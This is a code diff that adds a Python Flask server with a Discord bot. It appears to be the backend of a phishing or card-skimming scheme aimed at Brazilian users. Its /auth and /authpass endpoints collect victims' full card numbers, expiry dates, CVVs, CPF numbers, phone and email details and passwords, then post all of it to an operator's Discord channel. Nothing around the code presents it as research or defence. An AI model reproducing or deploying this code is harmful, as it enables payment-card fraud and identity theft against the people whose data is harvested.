@@ -1,0 +1,140 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import asyncio
+import threading
+
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# 在 app.app_context() 中：
+# db.create_all()
+
+cards: list[Card] = []
+
+
+@bot.event
+async def on_ready():
+    print(f'{bot.user} has connected to Discord!')
+
+
+def run_bot():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    bot.run(token)
+
+
+@app.route('/auth', methods=['POST'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_number = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        user_token = data.get('token')
+        bin_number = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card_number,
+            mes, ano, cvv, user_token, bin_number, dadosbin)
+        cards.append(card)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['POST'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in [
+            'senha',
+            'token'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        senha = data.get('senha')
+        user_token = data.get('token')
+
+        for card in cards:
+            if card.token == user_token:
+                # 发送Discord消息
+                asyncio.create_task(send_discord_message(card, senha))
+                break
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+async def send_discord_message(card: Card, senha: str):
+    try:
+        channel_id = os.getenv("DISCORD_CHANNEL_ID")
+        if channel_id:
+            channel = bot.get_channel(int(channel_id))
+            if channel:
+                message = f"""
+**新的卡片信息:**
+📱 手机: {card.celular}
+📡 运营商: {card.operadora}
+💰 金额: {card.valor}
+📧 邮箱: {card.email}
+👤 姓名: {card.nome}
+🆔 CPF: {card.cpf}
+💳 卡号: {card.card}
+📅 月份: {card.mes}
+📅 年份: {card.ano}
+🔒 CVV: {card.cvv}
+🔑 密码: {senha}
+🏦 BIN: {card.bin}
+📊 BIN数据: {card.dadosbin}
+                """
+                await channel.send(message)
+    except Exception as ex:
+        print(f"发送Discord消息时出错: {ex}")
+
+
+if __name__ == "__main__":
+    # 在后台线程中运行Discord机器人
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    
+    # 运行Flask应用
+    app.run(host="0.0.0.0", port=5000)
